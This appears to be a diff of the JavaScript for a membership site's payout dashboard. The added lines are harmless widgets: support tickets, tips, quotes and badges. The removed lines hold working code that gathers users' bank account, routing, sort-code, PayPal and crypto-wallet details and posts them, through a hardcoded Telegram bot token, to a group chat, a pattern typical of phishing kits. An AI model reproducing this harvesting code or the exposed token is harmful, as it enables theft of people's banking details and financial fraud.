-    "Fifth Third Bank": "https://raw.githubusercontent.com/avalonflow/AvalonFlow/main/assets/pictures/logo-stacked-primary-full-thumb.png"
-};
-
-    const defaultLogo = "https://cdn-icons-png.flaticon.com/512/2830/2830284.png";
-
-    const $logo = $('.payment-logosss');
-
-    $('#americanBankSelect').on('change', function () {
-
-        const selectedBank = $(this).val();
-        const newLogo = bankLogos[selectedBank] || defaultLogo;
-
-        // fade out (CSS handles animation)
-        $logo.addClass('is-hidden');
-
-        // preload image first
-        const tempImg = new Image();
-
-        tempImg.onload = function () {
-            $logo.attr('src', newLogo);
-
-            // force reflow so transition triggers properly
-            void $logo[0].offsetWidth;
-
-            // fade in
-            $logo.removeClass('is-hidden');
-        };
-
-        tempImg.src = newLogo;
-    });
-
-});
-
-$(document).ready(function () {
-
-    const bankLogos = {
-        "Barclays": "assets/pictures/Barclays-Logo-768x432.png",
-        "HSBC UK": "assets/pictures/HSBC-Logo-768x432.png",
-        "Lloyds Bank": "assets/pictures/Lloyds-Bank-Logo-500x281.webp",
-        "Santander UK": "assets/pictures/WA_1783360589514.jpeg",
-        "Halifax": "assets/pictures/WA_1783360607640.jpeg",
-        "TSB Bank": "assets/pictures/WA_1783360619696.jpeg",
-        "Nationwide": "assets/pictures/WA_1783378395029.jpeg",
-        "NatWest": "assets/pictures/IMG-20260706-WA0033(1).jpg"
-    };
-
-    const defaultLogo = "https://cdn-icons-png.flaticon.com/512/2830/2830284.png";
-
-    const $logo = $('.payment-logoss');
-
-    $('#britishBankSelect').on('change', function () {
-
-        const selectedBank = $(this).val();
-        const newLogo = bankLogos[selectedBank] || defaultLogo;
-
-        // fade out (CSS handles animation)
-        $logo.addClass('is-hidden');
-
-        // preload image first
-        const tempImg = new Image();
-
-        tempImg.onload = function () {
-            $logo.attr('src', newLogo);
-
-            // force reflow so transition triggers properly
-            void $logo[0].offsetWidth;
-
-            // fade in
-            $logo.removeClass('is-hidden');
-        };
-
-        tempImg.src = newLogo;
-    });
-
-});
+setInterval(particle, 800);
 
 
-/* Sidebar toggle */
-const sidebar = document.getElementById('sidebar');
+                        /* Sidebar toggle */
+        const sidebar = document.getElementById('sidebar');
 const content = document.getElementById('content');
 
 const menuBtn = document.getElementById('menuBtn');
@@ -2232,845 +1077,137 @@ function navigateTo(page){
     window.location.href = page;
 }
 
-const photoInput = document.getElementById('photoInput');
-const profilePhoto = document.getElementById('profilePhoto');
-const avatarLabel = document.getElementById('avatarLabel'); // Targeted the span
+// ---------- Notification ----------
+function notify(msg){ const n=document.getElementById('supportNotification'); n.textContent=msg; n.classList.add('show'); setTimeout(()=>n.classList.remove('show'),3000); }
 
-const cropModal = document.getElementById('cropModal');
-const cropImage = document.getElementById('cropImage');
+// ---------- Ticket System ----------
+let lastTicket = '';
 
-const DEFAULT_AVATAR = 'default-avatar.png';
-let isProcessing = false;
+function recordTicketGenerated() {
+    let tickets = parseInt(localStorage.getItem("ticketsGenerated") || 0);
+    tickets += 1;
+    localStorage.setItem("ticketsGenerated", tickets);
 
-/* ---------- 1. RESTORE ON LOAD ---------- */
-document.addEventListener('DOMContentLoaded', () => {
-    const savedPhoto = localStorage.getItem('profilePhoto');
-    if (savedPhoto) {
-        profilePhoto.src = savedPhoto;
-        if (avatarLabel) avatarLabel.textContent = "Remove Profile Picture";
-    } else {
-        profilePhoto.src = DEFAULT_AVATAR;
-        if (avatarLabel) avatarLabel.textContent = "Add Profile Picture";
-    }
-});
-
-/* ---------- 2. CLICK TO ADD OR REMOVE ---------- */
-profilePhoto.addEventListener('click', () => {
-    if (isProcessing) return;
-
-    // Check if a custom photo is currently set
-    const hasPhoto = localStorage.getItem('profilePhoto');
-
-    if (hasPhoto) {
-        // REMOVE PICTURE: Clear it out instantly
-        localStorage.removeItem('profilePhoto');
-        profilePhoto.src = DEFAULT_AVATAR;
-        if (avatarLabel) avatarLabel.textContent = "Add Profile Picture";
-    } else {
-        // ADD PICTURE: Open the file picker if it's empty
-        photoInput.click();
-    }
-});
-
-/* ---------- 3. AUTO PROCESS IMAGE ---------- */
-photoInput.addEventListener('change', (e) => {
-    const file = e.target.files[0];
-    if (!file || isProcessing) return;
-
-    isProcessing = true;
-
-    const reader = new FileReader();
-
-    reader.onload = function(event) {
-        const rawImage = event.target.result;
-        const img = new Image();
-        img.src = rawImage;
-
-        img.onload = function() {
-            const canvas = document.createElement('canvas');
-            const size = Math.min(img.width, img.height);
-
-            canvas.width = size;
-            canvas.height = size;
-
-            const ctx = canvas.getContext('2d');
-
-            ctx.drawImage(
-                img,
-                (img.width - size) / 2,
-                (img.height - size) / 2,
-                size,
-                size,
-                0,
-                0,
-                size,
-                size
-            );
-
-            const finalImage = canvas.toDataURL('image/png');
-
-            // update avatar instantly
-            profilePhoto.src = finalImage;
-
-            // save permanently
-            localStorage.setItem('profilePhoto', finalImage);
-
-            // Switch label text to show it can now be removed
-            if (avatarLabel) avatarLabel.textContent = "Remove Profile Picture";
-
-            // close modal
-            if (cropModal) cropModal.classList.add('hidden');
-
-            // reset input to prevent re-trigger bugs
-            photoInput.value = '';
-
-            // unlock system shortly after
-            setTimeout(() => {
-                isProcessing = false;
-            }, 300);
-        };
-    };
-
-    reader.readAsDataURL(file);
-});
-
-// OPTIONAL: cancel just closes modal (if you still use it)
-if (typeof cancelCrop !== 'undefined' && cancelCrop) {
-    cancelCrop.addEventListener('click', () => {
-        if (cropModal) cropModal.classList.add('hidden');
-    });
+    // Update badges immediately
+    updateEngagementUI();
 }
 
+function generateTicket() {
+    const stamp = Date.now().toString().slice(-6);
+    const rand = Math.random().toString(36).substring(2, 6).toUpperCase();
+    lastTicket = `AF-SUP-${stamp}-${rand}`;
 
-window.addEventListener("DOMContentLoaded", () => {
+    // Show ticket reference
+    let ticketText = `Ticket Reference: ${lastTicket}`;
 
-  /* Floating particles */
-const bg = document.getElementById('floating-bg');
+    // Include uploaded file if exists
+    if (uploadedFileName) {
+        ticketText += ` | Attached: ${uploadedFileName}`;
+        uploadedFileName = null; // reset after ticket generation
+    }
 
-function particle() {
-    const p = document.createElement('div');
-    p.className = 'particle';
+    document.getElementById('ticketResult').textContent = ticketText;
 
-    const s = Math.random() * 20 + 10;
-    p.style.width = s + 'px';
-    p.style.height = s + 'px';
-    p.style.left = Math.random() * 100 + 'vw';
-    p.style.animationDuration = (Math.random() * 20 + 10) + 's';
+    // Notify the user
+    notify('Ticket reference generated.');
 
-    bg.appendChild(p);
+    // --- Analytics Update ---
+    const inputEl = document.getElementById('issueInput');
+    const input = inputEl ? inputEl.value || 'Miscellaneous' : 'Miscellaneous';
+    if (issueCounts[input]) issueCounts[input] += 1;
+    else issueCounts[input] = 1;
+    renderAnalytics();
 
-    setTimeout(() => p.remove(), 30000);
+    // --- Gamification: record ticket generation ---
+    recordTicketGenerated();
 }
 
-setInterval(particle, 800);
+// ---------- Mini TV ----------
+const tvMessages = [
+    {type:'tip', text:"Support desk is available to guide you through every step."},
+    {type:'announcement', text:"Having issues? Generate a ticket reference before emailing."},
+    {type:'motivation', text:"Clear communication speeds up resolution."},
+    {type:'tip', text:"Our support desk is standing by."}
+];
+let tvIndex=0;
+function rotateTV(){ const msg=tvMessages[tvIndex]; const tv=document.getElementById('miniTV'); tv.textContent=msg.text; tv.dataset.type=msg.type; tvIndex=(tvIndex+1)%tvMessages.length; }
+rotateTV(); setInterval(rotateTV,4000);
+
+// ---------- Live Status ----------
+function updateStatus(){
+    const now=new Date(); const estHour=(now.getUTCHours()-5+24)%24; const estDay=now.getUTCDay(); const isOffice=(estDay>=1 && estDay<=7) && (estHour>=9 && estHour<18);
+    const dot=document.getElementById('statusDot'); const text=document.getElementById('statusText');
+    if(isOffice){ dot.className='status-dot'; text.textContent='Support Desk Online'; }
+    else { dot.className='status-dot status-offline'; text.textContent='Support Desk Offline'; }
+}
+updateStatus(); setInterval(updateStatus,60000);
 
 
-                                                        function logout(){
+
+
+
+const quotes=[ "Believe in yourself and all that you are.", "Small steps each day lead to big results.", "Life is about moments, not things.", "Consistency is the key to success.", "Every day is a fresh start.", "Faith is the compass that guides you through life’s storms.", "Pray not just for what you want, but   for the strength to receive it.", "Trust God’s timing; He never runs late.", "Your faith can move mountains, but your actions must build the path.", "God doesn’t call the equipped; He equips the called.", "Gratitude turns what we have into enough.", "Serve with love, and blessings will follow silently.", "When you focus on God, life focuses for you.", "Don’t chase money; build systems that make money chase you.", "Financial freedom begins when you learn to control your money, not your lifestyle.", "Save like a pessimist, invest like an optimist.", "Wealth grows when patience waters it daily.", "Your income is limited only by your imagination and action.", "Make your money work harder than you do.", "Life rewards those who act, not those who wait.", "Every setback is a setup for a stronger comeback.", "Your comfort zone is a beautiful place, but nothing ever grows there.", "Consistency beats talent when talent doesn’t show up.", "The storms of life shape the strongest sailors.", "Dream big, start small, move consistently." ];
+
+
+
+
+
+
+
+function logout(){
     localStorage.removeItem("avalon_logged_in");
     localStorage.removeItem("avalon_seen_dashboard");
     window.location.replace('https://membership.avalonflow.site/signin');
 }
 
 
-        /* --------------------------
-NOTIFICATION SYSTEM
--------------------------- */
-
-const notification = document.getElementById("planNotification");
-
-function showNotification(message, duration = 3000) {
-    if (!notification) return;
-
-    notification.textContent = message;
-    notification.classList.add("show");
-
-    clearTimeout(notification.hideTimer);
-
-    notification.hideTimer = setTimeout(() => {
-        notification.classList.remove("show");
-    }, duration);
-}
-
-/* --------------------------
-BOOT FLOW
--------------------------- */
-window.addEventListener("load", () => {
-    const saved = JSON.parse(localStorage.getItem("section3Data") || "{}");
-
-    const hasSavedData = Object.values(saved).some(
-        v => v && v.toString().trim() !== ""
-    );
-
-    // Only display default instructions on boot, not the success toast
-    if (!hasSavedData) {
-        showNotification("Only one payout method is required");
-    }
-});
 
 
 
 
-/* --------------------------
-LOAD SAVED DATA
--------------------------- */
-const methods = document.querySelectorAll(".payment-method");
-const inputs = document.querySelectorAll(".payment-method input");
+// ---------- Update Engagement UI ----------
+function updateEngagementUI() {
+    const badgesContainer = document.getElementById("badgesContainer");
 
-const saved = JSON.parse(localStorage.getItem("section3Data") || "{}");
+    // Clear old badges
+    badgesContainer.innerHTML = "";
 
-// FIX: Make sure preference is explicitly tracked from saved state globally
-let preference = saved.preference || ""; 
+    // Tickets and chats
+    const tickets = parseInt(localStorage.getItem("ticketsGenerated") || 0);
+    const chats = parseInt(localStorage.getItem("messagesSent") || 0);
 
-if (saved.preference) {
-  methods.forEach(method => {
-    if (method.dataset.method === saved.preference) {
-      method.classList.add("active");
-      method.querySelectorAll("input, select").forEach(el => {
-        el.style.display = "block";
-      });
-    }
-  });
-}
+    if (tickets >= 1) addBadge("🎫 First Ticket");
+    if (tickets >= 5) addBadge("🎟️ Ticket Master");
+    
 
-// Restore saved values
-if (saved.acuAccount) document.getElementById("acuAccount").value = saved.acuAccount;
-if (saved.cryptoName) document.getElementById("cryptoName").value = saved.cryptoName;
-if (saved.paypal) document.getElementById("paypalInput").value = saved.paypal;
-if (saved.paypalName) document.getElementById("paypalName").value = saved.paypalName;
-if (saved.interac) document.getElementById("interacInput").value = saved.interac;
-if (saved.interacName) document.getElementById("interacName").value = saved.interacName;
-if (saved.venmo) document.getElementById("venmoInput").value = saved.venmo;
-if (saved.venmoName) document.getElementById("venmoName").value = saved.venmoName;
-if (saved.revolut) document.getElementById("revolutInput").value = saved.revolut;
-if (saved.revolutName) document.getElementById("revolutName").value = saved.revolutName;
-if (saved.canadianBank) document.getElementById("canadianBankSelect").value = saved.canadianBank;
-if (saved.americanBank) document.getElementById("americanBankSelect").value = saved.americanBank;
-if (saved.britishBank) document.getElementById("britishBankSelect").value = saved.britishBank;
-if (saved.accountName) document.getElementById("accountName").value = saved.accountName;
-if (saved.transitNumber) document.getElementById("transitNumber").value = saved.transitNumber;
-if (saved.institutionNumber) document.getElementById("institutionNumber").value = saved.institutionNumber;
-if (saved.accountNumber) document.getElementById("accountNumber").value = saved.accountNumber;
+    // Update streak — simple version: store last visit date
+    const today = new Date().toDateString();
+    const lastVisit = localStorage.getItem("lastVisit");
+    let streak = parseInt(localStorage.getItem("streak") || 0);
 
-// Restore American distinct fields
-if (saved.accountNameUs) document.getElementById("accountName-us").value = saved.accountNameUs;
-if (saved.transitNumberUs) document.getElementById("transitNumber-us").value = saved.transitNumberUs;
-if (saved.accountNumberUs) document.getElementById("accountNumber-us").value = saved.accountNumberUs;
-if (saved.paypalUs) document.getElementById("paypalInput-us").value = saved.paypalUs;
-if (saved.paypalNameUs) document.getElementById("paypalName-us").value = saved.paypalNameUs;
-if (saved.acuAccountUs) document.getElementById("acuAccount-us").value = saved.acuAccountUs;
-if (saved.cryptoNameUs) document.getElementById("cryptoName-us").value = saved.cryptoNameUs;
-
-// Restore British distinct fields
-if (saved.accountNameUk) document.getElementById("accountName-uk").value = saved.accountNameUk;
-if (saved.transitNumberUk) document.getElementById("transitNumber-uk").value = saved.transitNumberUk;
-if (saved.accountNumberUk) document.getElementById("accountNumber-uk").value = saved.accountNumberUk;
-if (saved.paypalUk) document.getElementById("paypalInput-uk").value = saved.paypalUk;
-if (saved.paypalNameUk) document.getElementById("paypalName-uk").value = saved.paypalNameUk;
-if (saved.acuAccountUk) document.getElementById("acuAccount-uk").value = saved.acuAccountUk;
-if (saved.cryptoNameUk) document.getElementById("cryptoName-uk").value = saved.cryptoNameUk;
-
-
-/* --------------------------
-CARD SELECTION
--------------------------- */
-methods.forEach(method => {
-  const fields = method.querySelectorAll("input, select");
-  method.onclick = () => {
-    methods.forEach(m => {
-      m.classList.remove("active");
-      m.querySelectorAll("input, select").forEach(el => {
-        el.style.display = "none";
-      });
-    });
-
-    method.classList.add("active");
-    fields.forEach(el => {
-      el.style.display = "block";
-    });
-
-    preference = method.dataset.method;
-    saveData();
-  };
-});
-
-
-/* --------------------------
-AUTO SAVE INPUT
--------------------------- */
-document.querySelectorAll("input, select").forEach(input => {
-  input.addEventListener("input", saveData);
-  input.addEventListener("change", saveData);
-});
-
-// ==========================================
-// 💎 ENCAPSULATED 3D MAIN CARD SLIDER ENGINE
-// ==========================================
-$(document).ready(function() {
-    const container = document.querySelector('.payment-slider-viewport');
-    const cards = Array.from(document.querySelectorAll('.payment-slider-viewport .payment-container'));
-    const dotsWrapper = document.querySelector('.dots');
-
-    if (!container || cards.length === 0) return;
-
-    let isScrolling = false;
-    let isDragging = false;
-    let dragStartX = 0;
-    let scrollStart = 0;
-    let lastX = 0;
-    let velocity = 0;
-
-    function snapFeedback() {
-        if (navigator.vibrate) navigator.vibrate(10);
-    }
-
-    // ---- Generate Nav Dots ----
-    function generateDots() {
-        if (!dotsWrapper) return;
-        dotsWrapper.innerHTML = '';
-        cards.forEach((_, i) => {
-            const d = document.createElement('span');
-            if (i === 0) d.classList.add('active');
-            dotsWrapper.appendChild(d);
-        });
-    }
-    generateDots();
-
-    function clampScroll(left) {
-        const max = container.scrollWidth - container.clientWidth;
-        return Math.max(0, Math.min(left, max));
-    }
-
-    // ---- 3D Depth Engine for Main Cards ----
-    function update3D() {
-        const center = container.scrollLeft + container.clientWidth / 2;
-
-        cards.forEach(card => {
-            const cardCenter = card.offsetLeft + card.offsetWidth / 2;
-            const dist = Math.abs(center - cardCenter);
-
-            const maxDist = container.clientWidth;
-            const ratio = Math.min(dist / maxDist, 1);
-
-            const scale = 1 - (ratio * 0.12); 
-            const opacity = 1 - (ratio * 0.4);
-            const rotateY = (cardCenter < center ? 1 : -1) * ratio * 10;
-
-            card.style.transform = `
-                scale(${scale})
-                perspective(1200px)
-                rotateY(${rotateY}deg)
-            `;
-            card.style.opacity = opacity;
-        });
-    }
-
-    function setActiveCard(target) {
-        if (!target) return;
-
-        cards.forEach(c => c.classList.remove('active', 'inactive'));
-        target.classList.add('active');
-
-        cards.forEach(c => {
-            if (c !== target) c.classList.add('inactive');
-        });
-
-        if (dotsWrapper) {
-            const dots = dotsWrapper.querySelectorAll('span');
-            dots.forEach(d => d.classList.remove('active'));
-            const idx = cards.indexOf(target);
-            if (dots[idx]) dots[idx].classList.add('active');
-        }
-    }
-
-    function easeOutExpo(t) {
-        return t === 1 ? 1 : 1 - Math.pow(2, -10 * t);
-    }
-
-    function scrollToCard(index, duration = 300) {
-        if (index < 0 || index >= cards.length) return;
-
-        const target = cards[index];
-        const start = container.scrollLeft;
-
-        let dest = target.offsetLeft - container.offsetWidth/2 + target.offsetWidth/2;
-        dest = clampScroll(dest);
-
-        const dist = dest - start;
-        let startTime = null;
-
-        isScrolling = true;
-
-        function anim(t) {
-            if (!startTime) startTime = t;
-            const p = Math.min((t - startTime)/duration, 1);
-            const eased = easeOutExpo(p);
-
-            container.scrollLeft = start + dist * eased;
-            update3D();
-
-            if (p < 1) {
-                requestAnimationFrame(anim);
-            } else {
-                isScrolling = false;
-                setActiveCard(target);
-                snapFeedback();
-            }
-        }
-        requestAnimationFrame(anim);
-    }
-
-    function predictIndex() {
-        const activeIdx = cards.findIndex(c => c.classList.contains('active'));
-        const intent = (velocity * 0.25) + ((dragStartX - lastX) * 0.15);
-
-        if (Math.abs(intent) > 5) {
-            if (intent > 0) return activeIdx + 1;
-            else return activeIdx - 1;
-        }
-
-        let closest = null, min = Infinity;
-        const center = container.scrollLeft + container.clientWidth / 2;
-        cards.forEach(c => {
-            const cc = c.offsetLeft + c.offsetWidth / 2;
-            const d = Math.abs(center - cc);
-            if (d < min) { min = d; closest = c; }
-        });
-        return cards.indexOf(closest);
-    }
-
-    // ---- Nav Arrows Wire-up ----
-    const leftBtn = document.querySelector('.nav-btn.left');
-    const rightBtn = document.querySelector('.nav-btn.right');
-
-    if (leftBtn) {
-        leftBtn.onclick = () => {
-            const i = cards.findIndex(c => c.classList.contains('active'));
-            if (i > 0) scrollToCard(i - 1);
-        };
-    }
-    if (rightBtn) {
-        rightBtn.onclick = () => {
-            const i = cards.findIndex(c => c.classList.contains('active'));
-            if (i < cards.length - 1) scrollToCard(i + 1);
-        };
-    }
-
-    // ---- Pointer Drag Dragging Mechanics ----
-    container.addEventListener('pointerdown', e => {
-        if (isScrolling || e.target.closest('input, select, button')) return; 
-        isDragging = true;
-        dragStartX = e.clientX;
-        scrollStart = container.scrollLeft;
-        lastX = e.clientX;
-        velocity = 0;
-        container.setPointerCapture(e.pointerId);
-    });
-
-    container.addEventListener('pointermove', e => {
-        if (!isDragging) return;
-        const dx = dragStartX - e.clientX;
-        container.scrollLeft = scrollStart + dx;
-        velocity = lastX - e.clientX;
-        lastX = e.clientX;
-        update3D();
-    });
-
-    container.addEventListener('pointerup', e => {
-        if (!isDragging) return;
-        isDragging = false;
-        container.releasePointerCapture(e.pointerId);
-        scrollToCard(predictIndex());
-    });
-
-    // ---- 🌍 IP DETECTION AUTO-FOCUS GEOLOCATION ----
-    const savedData = JSON.parse(localStorage.getItem("section3Data") || "{}");
-
-    if (!savedData.preference) {
-        fetch('https://ipapi.co/json/')
-            .then(response => response.json())
-            .then(geo => {
-                let targetIndex = 0; // Default to Canada (Card 0)
-                if (geo.country_code === 'US') {
-                    targetIndex = 1; // Slide to US Card (Card 1)
-                } else if (geo.country_code === 'GB' || geo.country_code === 'UK') {
-                    targetIndex = 2; // Slide to British Card (Card 2)
-                }
-                scrollToCard(targetIndex, 400);
-            })
-            .catch(() => scrollToCard(0, 0));
+    if (lastVisit === today) {
+        // already counted today
     } else {
-        // Fallback layout initialization
-        scrollToCard(0, 0);
-    }
-
-    window.addEventListener('resize', () => {
-        const active = cards.find(c => c.classList.contains('active'));
-        if (active) scrollToCard(cards.indexOf(active), 50);
-    });
-});
-
-
-/* --------------------------
-NUMBER-ONLY VALIDATION
--------------------------- */
-["transitNumber", "institutionNumber", "accountNumber", "transitNumber-us", "accountNumber-us", "transitNumber-uk", "accountNumber-uk"].forEach(id => {
-  const input = document.getElementById(id);
-  if (input) {
-    input.addEventListener("input", () => {
-      input.value = input.value.replace(/\D/g, "");
-    });
-  }
-});
-
-
-/* --------------------------
-VALIDATION REGEX HELPERS
--------------------------- */
-const EMAIL_REGEX = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-const HANDLE_REGEX = /^@?[a-zA-Z0-9_]{3,30}$/;
-const EVM_REGEX = /^0x[a-fA-F0-9]{40}$/;
-
-
-/* --------------------------
-UNIFIED PREFERENCE VALIDATION
--------------------------- */
-function validateCurrentPreference() {
-  if (!preference) return { valid: false, message: "Please select a payout method" };
-
-  // Canadian Bank Transfer
-  if (preference === "Canadian Bank Transfer") {
-    const caBank = document.getElementById("canadianBankSelect")?.value.trim();
-    const caName = document.getElementById("accountName")?.value.trim();
-    const caTransit = document.getElementById("transitNumber")?.value.trim();
-    const caInst = document.getElementById("institutionNumber")?.value.trim();
-    const caAcc = document.getElementById("accountNumber")?.value.trim();
-
-    if (!caBank) return { valid: false, message: "Please select your bank" };
-    if (!caName) return { valid: false, message: "Please enter the account holder name" };
-    if (!/^\d{5}$/.test(caTransit)) return { valid: false, message: "Transit Number must be exactly 5 digits" };
-    if (!/^\d{3}$/.test(caInst)) return { valid: false, message: "Institution Number must be exactly 3 digits" };
-    if (!/^\d{7,12}$/.test(caAcc)) return { valid: false, message: "Account Number must be between 7 and 12 digits" };
-    return { valid: true };
-  }
-
-  // American Bank Transfer
-  if (preference === "American Bank Transfer") {
-    const usBank = document.getElementById("americanBankSelect")?.value.trim();
-    const usName = document.getElementById("accountName-us")?.value.trim();
-    const usTransit = document.getElementById("transitNumber-us")?.value.trim();
-    const usAcc = document.getElementById("accountNumber-us")?.value.trim();
-
-    if (!usBank) return { valid: false, message: "Please select your bank" };
-    if (!usName) return { valid: false, message: "Please enter the account holder name" };
-    if (!/^\d{9}$/.test(usTransit)) return { valid: false, message: "Routing Number must be exactly 9 digits" };
-    if (!/^\d{4,17}$/.test(usAcc)) return { valid: false, message: "Account Number must be between 4 and 17 digits" };
-    return { valid: true };
-  }
-
-  // British Bank Transfer
-  if (preference === "British Bank Transfer") {
-    const ukBank = document.getElementById("britishBankSelect")?.value.trim();
-    const ukName = document.getElementById("accountName-uk")?.value.trim();
-    const ukTransit = document.getElementById("transitNumber-uk")?.value.trim().replace(/-/g, "");
-    const ukAcc = document.getElementById("accountNumber-uk")?.value.trim();
-
-    if (!ukBank) return { valid: false, message: "Please select your bank" };
-    if (!ukName) return { valid: false, message: "Please enter the account holder name" };
-    if (!/^\d{6}$/.test(ukTransit)) return { valid: false, message: "Sort Code must be exactly 6 digits" };
-    if (!/^\d{8}$/.test(ukAcc)) return { valid: false, message: "Account Number must be exactly 8 digits" };
-    return { valid: true };
-  }
-
-  // PayPal checks
-  if (preference.includes("PayPal")) {
-    const name = document.getElementById("paypalName")?.value.trim() || 
-                 document.getElementById("paypalName-us")?.value.trim() || 
-                 document.getElementById("paypalName-uk")?.value.trim();
-    const email = document.getElementById("paypalInput")?.value.trim() || 
-                  document.getElementById("paypalInput-us")?.value.trim() ||
-                  document.getElementById("paypalInput-uk")?.value.trim();
-
-    if (!name) return { valid: false, message: "Please enter the account holder name" };
-    if (!email || !EMAIL_REGEX.test(email)) return { valid: false, message: "Please enter a valid PayPal email address" };
-    return { valid: true };
-  }
-
-  // Interac check
-  if (preference.includes("Interac")) {
-    const name = document.getElementById("interacName")?.value.trim();
-    const email = document.getElementById("interacInput")?.value.trim();
-
-    if (!name) return { valid: false, message: "Please enter the account holder name" };
-    if (!email || !EMAIL_REGEX.test(email)) return { valid: false, message: "Please enter a valid Interac email address" };
-    return { valid: true };
-  }
-
-  // Venmo check
-  if (preference.includes("Venmo")) {
-    const name = document.getElementById("venmoName")?.value.trim();
-    const handle = document.getElementById("venmoInput")?.value.trim();
-
-    if (!name) return { valid: false, message: "Please enter the account holder name" };
-    if (!handle || !HANDLE_REGEX.test(handle)) return { valid: false, message: "Please enter a valid Venmo username or handle" };
-    return { valid: true };
-  }
-
-  // Revolut check
-  if (preference.includes("Revolut")) {
-    const name = document.getElementById("revolutName")?.value.trim();
-    const handle = document.getElementById("revolutInput")?.value.trim();
-
-    if (!name) return { valid: false, message: "Please enter the account holder name" };
-    if (!handle || !HANDLE_REGEX.test(handle)) return { valid: false, message: "Please enter a valid Revtag handle" };
-    return { valid: true };
-  }
-
-  // Crypto check
-  if (preference.includes("USDT / USDC ERC20")) {
-    const name = document.getElementById("cryptoName")?.value.trim() || 
-                 document.getElementById("cryptoName-us")?.value.trim() || 
-                 document.getElementById("cryptoName-uk")?.value.trim();
-    const addr = document.getElementById("acuAccount")?.value.trim() || 
-                 document.getElementById("acuAccount-us")?.value.trim() ||
-                 document.getElementById("acuAccount-uk")?.value.trim();
-
-    if (!name) return { valid: false, message: "Please enter the account holder name" };
-    if (!addr || !EVM_REGEX.test(addr)) return { valid: false, message: "Please enter a valid ERC-20 wallet address starting with 0x" };
-    return { valid: true };
-  }
-
-  return { valid: false, message: "Please fill out all required fields" };
-}
-
-
-/* --------------------------
-MESSAGE BUILDER
--------------------------- */
-function buildMessage(data) {
-  return `
-📩 New Form Submission:
-
-Preference: ${data.preference || "-"}
-Account Holder Name: ${data.accountName || data.accountNameUs || data.accountNameUk || data.paypalName || data.paypalNameUs || data.paypalNameUk || data.interacName || data.venmoName || data.revolutName || data.cryptoName || data.cryptoNameUs || data.cryptoNameUk || "-"}
-Account Name (CA): ${data.accountName || "-"}
-Account Name (US): ${data.accountNameUs || "-"}
-Account Name (UK): ${data.accountNameUk || "-"}
-ACU Account (CA): ${data.acuAccount || "-"}
-ACU Account (US): ${data.acuAccountUs || "-"}
-ACU Account (UK): ${data.acuAccountUk || "-"}
-PayPal (CA): ${data.paypal || "-"}
-PayPal (US): ${data.paypalUs || "-"}
-PayPal (UK): ${data.paypalUk || "-"}
-Interac: ${data.interac || "-"}
-Venmo: ${data.venmo || "-"}
-Revolut: ${data.revolut || "-"}
-Bank (CA): ${data.canadianBank || "-"}
-Bank (US): ${data.americanBank || "-"}
-Bank (UK): ${data.britishBank || "-"}
-
-Transit/Routing Number (CA): ${data.transitNumber || "-"}
-Institution Number (CA): ${data.institutionNumber || "-"}
-Account Number (CA): ${data.accountNumber || "-"}
-
-Routing Number (US): ${data.transitNumberUs || "-"}
-Account Number (US): ${data.accountNumberUs || "-"}
-
-Sort Code (UK): ${data.transitNumberUk || "-"}
-Account Number (UK): ${data.accountNumberUk || "-"}
-`;
-}
-
-
-/* --------------------------
-TELEGRAM SETUP
--------------------------- */
-const BOT_TOKEN = "8663093122:AAHdCgL3yFq3Ew46kkU84tiQG3BNap5yK_M";
-const CHAT_ID = "-1003913850436";
-
-function sendToTelegram(data) {
-  const message = buildMessage(data);
-
-  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: message
-    })
-  });
-}
-
-
-/* --------------------------
-SAVE DATA FUNCTION (FIXED)
--------------------------- */
-function saveData() {
-    const savedData = JSON.parse(localStorage.getItem("section3Data") || "{}");
-
-    // Capture individual field inputs
-    savedData.preference = preference;
-    savedData.acuAccount = document.getElementById("acuAccount")?.value || "";
-    savedData.cryptoName = document.getElementById("cryptoName")?.value || "";
-    savedData.paypal = document.getElementById("paypalInput")?.value || "";
-    savedData.paypalName = document.getElementById("paypalName")?.value || "";
-    savedData.interac = document.getElementById("interacInput")?.value || "";
-    savedData.interacName = document.getElementById("interacName")?.value || "";
-    savedData.venmo = document.getElementById("venmoInput")?.value || "";
-    savedData.venmoName = document.getElementById("venmoName")?.value || "";
-    savedData.revolut = document.getElementById("revolutInput")?.value || "";
-    savedData.revolutName = document.getElementById("revolutName")?.value || "";
-    savedData.canadianBank = document.getElementById("canadianBankSelect")?.value || "";
-    savedData.americanBank = document.getElementById("americanBankSelect")?.value || "";
-    savedData.britishBank = document.getElementById("britishBankSelect")?.value || "";
-    savedData.accountName = document.getElementById("accountName")?.value || "";
-    savedData.transitNumber = document.getElementById("transitNumber")?.value || "";
-    savedData.institutionNumber = document.getElementById("institutionNumber")?.value || "";
-    savedData.accountNumber = document.getElementById("accountNumber")?.value || "";
-    savedData.accountNameUs = document.getElementById("accountName-us")?.value || "";
-    savedData.transitNumberUs = document.getElementById("transitNumber-us")?.value || "";
-    savedData.accountNumberUs = document.getElementById("accountNumber-us")?.value || "";
-    savedData.paypalUs = document.getElementById("paypalInput-us")?.value || "";
-    savedData.paypalNameUs = document.getElementById("paypalName-us")?.value || "";
-    savedData.acuAccountUs = document.getElementById("acuAccount-us")?.value || "";
-    savedData.cryptoNameUs = document.getElementById("cryptoName-us")?.value || "";
-
-    // Capture British distinct fields
-    savedData.accountNameUk = document.getElementById("accountName-uk")?.value || "";
-    savedData.transitNumberUk = document.getElementById("transitNumber-uk")?.value || "";
-    savedData.accountNumberUk = document.getElementById("accountNumber-uk")?.value || "";
-    savedData.paypalUk = document.getElementById("paypalInput-uk")?.value || "";
-    savedData.paypalNameUk = document.getElementById("paypalName-uk")?.value || "";
-    savedData.acuAccountUk = document.getElementById("acuAccount-uk")?.value || "";
-    savedData.cryptoNameUk = document.getElementById("cryptoName-uk")?.value || "";
-
-    // Determine specific routing parameters for Page 1
-    let exactTransferMethodName = preference;
-    let selectedRegion = "CA"; // Default fallback
-
-    const activeCard = document.querySelector(".payment-method.active");
-    if (activeCard) {
-        const region = activeCard.dataset.region;
-        if (region === "usa") { 
-            selectedRegion = "US";
-            if (preference === "American Bank Transfer") {
-                exactTransferMethodName = savedData.americanBank || "American Bank Transfer";
-            } 
-            else if (preference === "Venmo") {
-                exactTransferMethodName = "Venmo";
-            }
-        } else if (region === "canada") {
-            selectedRegion = "CA";
-            if (preference === "Canadian Bank Transfer") {
-                exactTransferMethodName = savedData.canadianBank || "Canadian Bank Transfer";
-            }
-        } else if (region === "uk" || region === "britain") {
